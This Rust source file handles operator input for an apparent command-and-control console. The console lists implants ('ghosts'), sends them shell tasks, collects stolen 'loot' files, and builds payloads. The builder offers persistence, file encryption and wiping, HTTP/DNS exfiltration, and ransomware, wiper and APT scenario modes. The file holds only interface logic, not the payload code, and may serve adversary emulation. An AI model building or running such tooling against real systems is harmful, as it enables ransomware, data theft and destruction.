use crate::action::Action;
use crate::models::{GhostConfigUpdate, TaskRequest};
use crate::state::{AppState, BuilderField, ConfigField, CurrentScreen};

#[derive(Debug, PartialEq)]
pub enum Command {
    Quit,
    FetchGhosts,
    FetchTasks(String),
    SendTask { ghost_id: String, req: TaskRequest },
    UpdateGhostConfig { ghost_id: String, config: GhostConfigUpdate },
    KillGhost(String),
    BuildPayload {
        url: String,
        port: String,
        debug: bool,

        scenario_mode: String,

        // persistence
        persistence: bool,
        persist_runcontrol: bool,
        persist_service: bool,
        persist_cron: bool,

        // impact
        impact: bool,
        impact_level: String,
        impact_encrypt: bool,
        encryption_algo: String,
        impact_wipe: bool,

        // exfiltration
        exfil: bool,
        exfil_http: bool,
        exfil_dns: bool
    },
    FetchLootList,
    DownloadLoot(String, String),   // filename, dest_path
}

pub fn update(app: &mut AppState, action: Action) -> Option<Command> {
    match action {
        // system
        Action::Quit => return Some(Command::Quit),
        Action::Tick => {},
        Action::Resize(_, _) => {},

        // global navigation
        Action::NextTab => { app.next_tab(); return None },
        Action::PrevTab => app.prev_tab(),
        Action::ToggleHelp => app.show_help = !app.show_help,

        // auto refresh
        Action::AutoRefresh => {
            if app.show_action_menu { return None; }

            match app.current_screen {
                CurrentScreen::Dashboard => return Some(Command::FetchGhosts),
                CurrentScreen::Terminal => {
                    if let Some(gid) = &app.terminal.active_ghost_id {
                        return Some(Command::FetchTasks(gid.clone()));
                    }
                },
                CurrentScreen::Loot => return Some(Command::FetchLootList),
                _ => {}
            }
        }

        // context-sensitive input
        Action::Up => handle_nav_up(app),
        Action::Down => handle_nav_down(app),
        Action::Left => app.prev_tab(),
        Action::Right => { app.next_tab(); return None },
        Action::Enter => return handle_enter(app),
        Action::Esc => handle_esc(app),
        Action::Backspace => handle_backspace(app),
        Action::Char(c) => return handle_char_input(app, c),

        // view-dependent actions
        Action::OpenActionMenu => {
            if app.current_screen == CurrentScreen::Dashboard && app.dashboard.selected_ghost_id().is_some() {
                app.show_action_menu = true;
            }
        },
        Action::ConfirmKillGhost => {
            if let Some(gid) = app.dashboard.selected_ghost_id() {
                app.show_action_menu = false;
                app.status_message = format!("Killing ghost {}...", gid);

                return Some(Command::KillGhost(gid));
            }
        },
        Action::SubmitGhostConfig => return handle_config_submit(app),
        Action::ToggleBuilderSwitch => handle_builder_toggle(app),
        Action::StartBuild => return handle_build_start(app),

        // network
        Action::ReceiveGhosts(result) => match result {
            Ok(ghosts) => {
                app.dashboard.ghosts = ghosts;
                app.status_message = format!("Updated: {} ghosts online", app.dashboard.ghosts.len());
            },
            Err(e) => app.status_message = format!("Error fetching ghosts: {}", e)
        },
        Action::ReceiveTasks(result) => match result {
            Ok(tasks) => {
                let should_scroll = tasks.len() > app.terminal.tasks.len();
                app.terminal.tasks = tasks;

                if should_scroll {
                    app.terminal.scroll_to_bottom();
                }
            },
            Err(e) => app.status_message = format!("Error fetching tasks: {}", e)
        },
        Action::ReceiveTaskSendResult(result) => match result {
            Ok(message) => {
                app.status_message = format!("Task send: {}", message);

                if let Some(gid) = app.terminal.active_ghost_id.clone() {
                    return Some(Command::FetchTasks(gid));
                }
            },
            Err(e) => app.status_message = format!("Error: {}", e)
        },
        Action::ReceiveConfigUpdateResult(result) => match result {
            Ok(message) => app.status_message = format!("Config updated: {}", message),
            Err(e) => app.status_message = format!("Error: {}", e)
        },
        Action::ReceiveKillResult(result) => match result {
            Ok(message) => {
                app.status_message = format!("Kill result: {}", message);

                return Some(Command::FetchGhosts);
            },
            Err(e) => app.status_message = format!("Error: {}", e)
        },
        Action::ReceiveBuildResult(result) => match result {
            Ok(message) => {
                app.builder.build_status_msg = "SUCCESS".to_string();
                app.status_message = format!("Build success: {}", message)
            },
            Err(e) => {
                app.builder.build_status_msg = "FAILED".to_string();
                app.status_message = format!("Error: {}", e);
            }
        },
        Action::ReceiveLootList(result) => match result {
            Ok(files) => app.loot.files = files,
            Err(e) => app.status_message = format!("Error fetching loot {}", e)
        },
        Action::ReceiveLootDownload(result) => match result {
            Ok(msg) => app.status_message = msg,
            Err(e) => app.status_message = format!("Download error {}", e)
        },
    }

    None
}

fn handle_nav_up(app: &mut AppState) {
    if app.show_action_menu {
        return;
    }

    match app.current_screen {
        CurrentScreen::Dashboard => app.dashboard.select_prev(),
        CurrentScreen::Terminal => app.terminal.scroll_up(),
        CurrentScreen::Config => app.config.prev_field(),
        CurrentScreen::Builder => app.builder.prev_field(),
        CurrentScreen::Loot => app.loot.scroll_up(),
    }
}

fn handle_nav_down(app: &mut AppState) {
    if app.show_action_menu {
        return;
    }

    match app.current_screen {
        CurrentScreen::Dashboard => app.dashboard.select_next(),
        CurrentScreen::Terminal => app.terminal.scroll_down(),
        CurrentScreen::Config => app.config.next_field(),
        CurrentScreen::Builder => app.builder.next_field(),
        CurrentScreen::Loot => app.loot.scroll_down(),
    }
}

fn handle_enter(app: &mut AppState) -> Option<Command> {
    if app.show_action_menu {
        return Some(Command::KillGhost(app.dashboard.selected_ghost_id()?));
    }

    match app.current_screen {
        CurrentScreen::Dashboard => {
            if let Some(gid) = app.dashboard.selected_ghost_id() {
                app.current_screen = CurrentScreen::Terminal;
                app.terminal.active_ghost_id = Some(gid.clone());
                app.status_message = format!("Viewing tasks for {}", gid);

                return Some(Command::FetchTasks(gid));
            }
        },
        CurrentScreen::Terminal => {
            let input = app.terminal.input_buffer.trim().to_string();
            if input.is_empty() || app.terminal.active_ghost_id.is_none() {
                return None;
            }

            let ghost_id = app.terminal.active_ghost_id.clone().unwrap();
            app.terminal.input_buffer.clear();

            let parts: Vec<&str> = input.splitn(2, ' ').collect();
            let (command, args) = match parts[0] {
                "EXEC" | "STOP_HAUNT" | "IMPACT" => (parts[0].to_string(), parts.get(1).unwrap_or(&"").to_string()),
                _ => ("EXEC".to_string(), input)
            };

            return Some(Command::SendTask {
                ghost_id,
                req: TaskRequest { command, args }
            });
        },
        CurrentScreen::Config => {
            if app.config.selected_field == ConfigField::Submit {
                return handle_config_submit(app);
            } else {
                app.config.next_field();
            }
        },
        CurrentScreen::Builder => {
            if app.builder.selected_field == BuilderField::Submit {
                return handle_build_start(app);
            }

            if app.builder.selected_field == BuilderField::CategorySelect {
                app.builder.active_category = app.builder.active_category.next();
                app.builder.next_field();
                app.builder.selected_field = BuilderField::CategorySelect;

                return None;
            }

            match app.builder.selected_field {
                BuilderField::Url | BuilderField::Port => app.builder.next_field(),
                _ => handle_builder_toggle(app)
            }
        },
        CurrentScreen::Loot => {
            let filtered = app.loot.filtered_files();
            if let Some(i) = app.loot.list_state.selected() {
                if let Some(filename) = filtered.get(i) {
                    let _ = std::fs::create_dir_all("loot");

                    let dest = format!("loot/{}", filename);
                    
                    app.status_message = format!("Downloading {}...", filename);
                    return Some(Command::DownloadLoot(filename.clone(), dest));
                }
            }
        }
    }

    None
}

fn handle_esc(app: &mut AppState) {
    if app.show_action_menu {
        app.show_action_menu = false;

        return;
    }

    if app.current_screen == CurrentScreen::Terminal {
        if app.terminal.input_mode {
            app.terminal.input_mode = false;
        }
    }

    if app.current_screen == CurrentScreen::Loot {
        app.loot.search_mode = false;
    }
}

fn handle_backspace(app: &mut AppState) {
    match app.current_screen {
        CurrentScreen::Terminal => {
            if app.terminal.input_mode {
                app.terminal.input_buffer.pop();
            }
        },
        CurrentScreen::Config => match app.config.selected_field {
            ConfigField::Sleep => { app.config.sleep_input.pop(); },
            ConfigField::Jitter => { app.config.jitter_input.pop(); },
            _ => {},
        },
        CurrentScreen::Builder => match app.builder.selected_field {
            BuilderField::Url => { app.builder.target_url.pop(); },
            BuilderField::Port => { app.builder.target_port.pop(); },
            _ => {}
        },
        CurrentScreen::Loot => {
            if app.loot.search_mode { app.loot.search_query.pop(); }
        },
        _ => {}
    }
}

fn handle_char_input(app: &mut AppState, c: char) -> Option<Command> {
    let is_typing = match app.current_screen {
        CurrentScreen::Terminal => app.terminal.input_mode,
        CurrentScreen::Config => c.is_numeric(),
        CurrentScreen::Builder => matches!(app.builder.selected_field, BuilderField::Url | BuilderField::Port),
        CurrentScreen::Loot => app.loot.search_mode,
        _ => false
    };

    if !is_typing {
        match c {
            'q' => return Some(Command::Quit),
            'h' => { app.show_help = !app.show_help; return None; },
            _ => {}
        }
    }

    match app.current_screen {
        CurrentScreen::Dashboard => {
            if c == 'x' {
                if app.dashboard.selected_ghost_id().is_some() {
                    app.show_action_menu = true;
                }
            }

            if c == 'r' {
                return Some(Command::FetchGhosts);
            }
        },
        CurrentScreen::Terminal => {
            if app.terminal.input_mode {
                app.terminal.input_buffer.push(c);
            } else if c == 'i' {
                app.terminal.input_mode = true;
            }
        },
        CurrentScreen::Config => {
            if c.is_numeric() {
                match app.config.selected_field {
                    ConfigField::Sleep => app.config.sleep_input.push(c),
                    ConfigField::Jitter => app.config.jitter_input.push(c),
                    _ => {}
                }
            }
        },
        CurrentScreen::Builder => {
            match app.builder.selected_field {
                BuilderField::Url => {
                    app.builder.target_url.push(c);
                },
                BuilderField::Port => {
                    if c.is_numeric() {
                        app.builder.target_port.push(c);
                    }
                },
                _ => {}
            }
        },
        CurrentScreen::Loot => {
            if app.loot.search_mode {
                app.loot.search_query.push(c);
                app.loot.list_state.select(Some(0));
            } else if c == '/' || c == 's' {
                app.loot.search_mode = true;
            }
        }
    }

    None
}

fn handle_config_submit(app: &mut AppState) -> Option<Command> {
    if let Some(gid) = app.dashboard.selected_ghost_id() {
        let sleep = app.config.sleep_input.parse::<i64>().unwrap_or(10);
        let jitter = app.config.jitter_input.parse::<i16>().unwrap_or(5);

        app.status_message = "Sending config...".to_string();

        return Some(Command::UpdateGhostConfig {
            ghost_id: gid,
            config: GhostConfigUpdate { sleep_interval: sleep, jitter_percent: jitter }
        });
    }

    None
}

fn handle_builder_toggle(app: &mut AppState) {
    use BuilderField::*;

    match app.builder.selected_field {
        EnableDebug => app.builder.enable_debug = !app.builder.enable_debug,

        Scenario => {
            let modes = ["NONE", "RANSOMWARE", "ESPIONAGE", "WIPER", "INFOSTEALER", "APT", "APT29", "APT44", "APT38"];
            let current_idx = modes.iter().position(|&m| m == app.builder.scenario_mode).unwrap_or(0);
            let next_idx = (current_idx + 1) % modes.len();
            app.builder.scenario_mode = modes[next_idx].to_string();
        },

        PersistToggle => {
            app.builder.enable_persistence = !app.builder.enable_persistence;

            if !app.builder.enable_persistence {
                app.builder.persist_runcontrol = false;
                app.builder.persist_service = false;
                app.builder.persist_cron = false;
            }
        },
        PersistRunControl => app.builder.persist_runcontrol = !app.builder.persist_runcontrol,
        PersistService => app.builder.persist_service = !app.builder.persist_service,
        PersistCron => app.builder.persist_cron = !app.builder.persist_cron,

        ImpactToggle => {
            app.builder.enable_impact = !app.builder.enable_impact;

            if !app.builder.enable_impact {
                app.builder.impact_encrypt = false;
                app.builder.impact_wipe = false;
            }
        },
        ImpactLevel => {
            let levels = ["TEST", "USER", "SYSTEM"];
            let current_idx = levels.iter().position(|&l| l == app.builder.impact_level).unwrap_or(0);
            let next_idx = (current_idx + 1) % levels.len();
            app.builder.impact_level = levels[next_idx].to_string();
        },
        ImpactEncrypt => app.builder.impact_encrypt = !app.builder.impact_encrypt,

        ImpactEncryptAlgoXor => app.builder.encryption_algo = "XOR".to_string(),
        ImpactEncryptAlgoAes => app.builder.encryption_algo = "AES".to_string(),
        ImpactEncryptAlgoChacha => app.builder.encryption_algo = "CHACHA".to_string(),

        ImpactWipe => app.builder.impact_wipe = !app.builder.impact_wipe,

        ExfilToggle => {
            app.builder.enable_exfil = !app.builder.enable_exfil;

            app.builder.exfil_http = false;
            app.builder.exfil_dns = false;
        },
        ExfilHttp => app.builder.exfil_http = !app.builder.exfil_http,
        ExfilDns => app.builder.exfil_dns = !app.builder.exfil_dns,
        _ => {}
    }
}

fn handle_build_start(app: &mut AppState) -> Option<Command> {
    app.builder.build_status_msg = "BUILDING...".to_string();
    app.status_message = "Starting build process...".to_string();

    Some(Command::BuildPayload {
        url: app.builder.target_url.clone(),
        port: app.builder.target_port.clone(),
        debug: app.builder.enable_debug,

        scenario_mode: app.builder.scenario_mode.clone(),

        persistence: app.builder.enable_persistence,
        persist_runcontrol: app.builder.persist_runcontrol,
        persist_service: app.builder.persist_service,
        persist_cron: app.builder.persist_cron,

        impact: app.builder.enable_impact,
        impact_level: app.builder.impact_level.clone(),
        impact_encrypt: app.builder.impact_encrypt,
        encryption_algo: app.builder.encryption_algo.clone(),
        impact_wipe: app.builder.impact_wipe,

        exfil: app.builder.enable_exfil,
        exfil_http: app.builder.exfil_http,
        exfil_dns: app.builder.exfil_dns
    })
}
